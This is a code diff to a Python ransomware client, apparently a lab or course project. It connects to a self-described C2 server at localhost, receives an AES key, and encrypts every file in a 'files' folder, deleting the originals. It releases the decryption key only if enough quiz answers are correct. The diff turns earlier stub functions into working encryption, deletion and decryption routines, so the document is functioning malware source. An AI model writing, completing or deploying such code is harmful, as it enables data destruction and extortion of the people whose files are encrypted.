@@ -4,6 +4,7 @@ from pathlib import Path
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import getpass
 import socket
 import threading
@@ -17,51 +18,83 @@ class Requests(enum.Enum):
     NOT_ENOUGH_CORRECT_ANSWERS = "NOT_ENOUGH_CORRECT_ANSWERS"
     EXIT = "EXIT"
 
-def encrypt_file(file_path: str, cipher: Fernet) -> bool:
+def encrypt_folder(folder_path: str, key: bytes):
     """
-    Encrypt a single file using Fernet (AES-256).
-    
-    Args:
-        file_path: Path to the file to encrypt
-        cipher: Fernet cipher object
-    
-    Returns:
-        bool: True if successful, False otherwise
+    Encrypt all files in a folder using AES-256-GCM.
+    Files are renamed with .enc extension.
+    Skips files already ending in .enc
     """
-    print("Encrypting the file")
-    return True
 
-def encrypt_folder(key, salt, folder_path: str, save_salt: bool = True) -> bool:
-    """
-    Encrypt all files in a given folder using AES-256.
-    
-    Args:
-        key: The encryption key
-        salt: The salt for key derivation
-        folder_path: Path to the folder containing files to encrypt
-        save_salt: Whether to save the salt to a file (for decryption)
-    
-    Returns:
-        bool: True if successful, False otherwise
-    """
-    print("Encrypting foder")
-    return True
+    if len(key) != 32:
+        raise ValueError("Key must be 32 bytes for AES-256")
 
+    for root, _, files in os.walk(folder_path):
+        for file in files:
+            if file.endswith(".enc"):
+                continue  # skip already encrypted
 
-def decrypt_folder(folder_path: str, password: str = None, salt_path: str = None) -> bool:
+            file_path = os.path.join(root, file)
+
+            with open(file_path, "rb") as f:
+                data = f.read()
+
+            nonce = os.urandom(12)
+            aesgcm = AESGCM(key)
+
+            encrypted_data = aesgcm.encrypt(nonce, data, None)
+
+            # Save encrypted file
+            enc_file_path = file_path + ".enc"
+
+            with open(enc_file_path, "wb") as f:
+                f.write(nonce + encrypted_data)
+
+            # Remove original file
+            os.remove(file_path)
+
+            print(f"Encrypted: {file_path} -> {enc_file_path}")
+
+def decrypt_folder(folder_path: str, key: bytes):
     """
-    Decrypt all encrypted files in a given folder.
-    
-    Args:
-        folder_path: Path to the folder containing encrypted files
-        password: Password for decryption (if None, prompts user)
-        salt_path: Path to the salt file (if None, looks for .salt in folder)
-    
-    Returns:
-        bool: True if successful, False otherwise
+    Decrypt all .enc files in a folder using AES-256-GCM.
+    Restores original filenames by removing .enc extension.
+    Skips non-.enc files.
     """
-    print("Decrypting folder")
-    return True
+
+    if len(key) != 32:
+        raise ValueError("Key must be 32 bytes for AES-256")
+
+    for root, _, files in os.walk(folder_path):
+        for file in files:
+            if not file.endswith(".enc"):
+                continue  # only decrypt encrypted files
+
+            file_path = os.path.join(root, file)
+
+            with open(file_path, "rb") as f:
+                file_data = f.read()
+
+            nonce = file_data[:12]
+            ciphertext = file_data[12:]
+
+            aesgcm = AESGCM(key)
+
+            try:
+                decrypted_data = aesgcm.decrypt(nonce, ciphertext, None)
+            except Exception:
+                print(f"Failed to decrypt: {file_path}")
+                continue
+
+            # Restore original filename (remove .enc)
+            original_file_path = file_path[:-4]
+
+            with open(original_file_path, "wb") as f:
+                f.write(decrypted_data)
+
+            # Remove encrypted file
+            os.remove(file_path)
+
+            print(f"Decrypted: {file_path} -> {original_file_path}")
 
 
 def validate_question(question: str, server_socket: socket):
@@ -103,13 +136,28 @@ def handle_server_communication(server_socket: socket):
             
             k, s = response.split("::")
 
-            key = base64.b64decode(k)
+            # First decode the base64 pieces from the server
+            decoded_key = base64.b64decode(k)
             salt = base64.b64decode(s)
-            
+
+            # Some server variants may double-base64 the key (so the decoded
+            # value is an ASCII base64 string). Normalize to the raw 32-byte key
+            # required by AES-256-GCM.
+            key = decoded_key
+            if len(key) != 32:
+                try:
+                    maybe = base64.b64decode(key)
+                    if len(maybe) == 32:
+                        key = maybe
+                except Exception:
+                    pass
+
             print("Key:", key)
             print("Salt:", salt)
-            #encrypt with the received key and salt
-            encrypt_folder(key, salt, "/test", save_salt=False)
+
+            # encrypt using the repository's files directory
+            base_files_dir = "files"
+            encrypt_folder(str(base_files_dir), key)
 
             del key
             del salt
@@ -121,9 +169,21 @@ def handle_server_communication(server_socket: socket):
                 print("Not enough correct answers to receive the decryption key, too bad :D")
             else:
                 k, s = response.split("::")
-                key = base64.b64decode(k)
+                decoded_key = base64.b64decode(k)
                 salt = base64.b64decode(s)
-                decrypt_folder("/test", password=None, salt_path=None)
+
+                key = decoded_key
+                if len(key) != 32:
+                    try:
+                        maybe = base64.b64decode(key)
+                        if len(maybe) == 32:
+                            key = maybe
+                    except Exception:
+                        pass
+
+                print(key)
+                base_files_dir = "files"
+                decrypt_folder(str(base_files_dir), key)
                 break
     except Exception as e:
         print(f"Error communicating with C2 server: {str(e)}")
@@ -140,23 +200,17 @@ def connect_to_server(server_ip: str, server_port: int):
         server_port: Port number of the C2 server
     """
 
-    
-    # Create a TCP socket
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     try:
-        # Connect to the server
         server_socket.connect((server_ip, server_port))
         print(f"Connected to C2 server at {server_ip}:{server_port}")
         
-        # Handle communication in a separate thread
         threading.Thread(target=handle_server_communication, args=(server_socket,)).start()
         
     except Exception as e:
         print(f"Failed to connect to C2 server: {str(e)}")
         server_socket.close()
 
-
-# Example usage and testing
 if __name__ == "__main__":
     connect_to_server("127.0.0.1", 4444)
